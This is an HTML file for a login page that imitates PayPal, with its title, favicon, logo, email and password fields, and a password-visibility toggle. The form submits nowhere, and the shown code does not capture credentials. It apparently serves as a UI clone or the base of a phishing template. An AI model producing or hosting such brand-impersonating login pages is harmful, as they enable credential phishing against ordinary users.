<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in to your PayPal account</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="shortcut icon" href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200" />
    <style>
        body {
            font-family: 'Inter', sans-serif;
            background-color: #f0f2f5;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .animate-fade-in {
            animation: fadeIn 0.8s ease-out forwards;
        }

        input:focus {
            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.45);
        }
    </style>
</head>
<body class="bg-gray-100 min-h-screen flex flex-col justify-between items-center p-4">
    <div class="flex-grow flex items-center justify-center w-full">
        <div class="bg-white p-6 rounded-lg border border-gray-300 max-w-sm w-full animate-fade-in">
            <img src="https://logolook.net/wp-content/uploads/2021/07/Paypal-Logo.png" alt="PayPal Logo" class="mx-auto h-[50px] w-[100px] mb-6">
            <form class="space-y-4">
                <div>
                    <input type="text" placeholder="Email or mobile number" class="w-full p-3 border border-gray-300 rounded-md focus:outline-none focus:border-blue-500 transition-colors">
                </div>
                <div class="relative">
                    <input type="password" id="password-input" placeholder="Enter your password" class="w-full p-3 border border-gray-300 rounded-md focus:outline-none focus:border-blue-500 transition-colors">
                    <span id="password-toggle" class="material-symbols-outlined text-gray-500 absolute right-4 top-1/2 -translate-y-1/2 cursor-pointer hidden">visibility_off</span>
                </div>
                <div class="text-left">
                    <a href="#" class="text-blue-600 text-sm font-bold hover:underline">Forgot password?</a>
                </div>
                <button type="submit" class="w-full p-3 bg-blue-600 text-white font-semibold rounded-full hover:bg-blue-700 transition-colors duration-200 shadow">Log In</button>
            </form>
            <div class="flex items-center my-6">
                <div class="flex-grow border-t border-gray-300"></div>
                <span class="flex-shrink mx-4 text-gray-500 text-sm">or</span>
                <div class="flex-grow border-t border-gray-300"></div>
            </div>
            <a href="#" class="block w-full text-center p-3 border-2 border-blue-600 text-blue-600 font-semibold rounded-full hover:bg-blue-50 transition-colors duration-200">Sign Up</a>
            <div class="flex items-center justify-center mt-6">
                <span class="material-symbols-outlined text-gray-500 mr-2" style="font-size: 16px;">language</span>
                <p class="text-gray-500 text-sm">English</p>
            </div>
        </div>
    </div>
    <footer class="w-full text-center text-xs text-gray-500 p-4 border-t border-gray-200">
        <div class="flex justify-center space-x-4">
            <a href="#" class="hover:underline">Contact Us</a>
            <a href="#" class="hover:underline">Privacy</a>
            <a href="#" class="hover:underline">Legal</a>
            <a href="#" class="hover:underline">Policy Updates</a>
            <a href="#" class="hover:underline">Worldwide</a>
        </div>
    </footer>

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const passwordInput = document.getElementById('password-input');
            const passwordToggle = document.getElementById('password-toggle');

            passwordInput.addEventListener('input', () => {
                if (passwordInput.value.length > 0) {
                    passwordToggle.classList.remove('hidden');
                } else {
                    passwordToggle.classList.add('hidden');
                }
            });

            passwordToggle.addEventListener('click', () => {
                const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
                passwordInput.setAttribute('type', type);
                if (type === 'text') {
                    passwordToggle.textContent = 'visibility';
                } else {
                    passwordToggle.textContent = 'visibility_off';
                }
            });
        });
    </script>

</body>
</html>
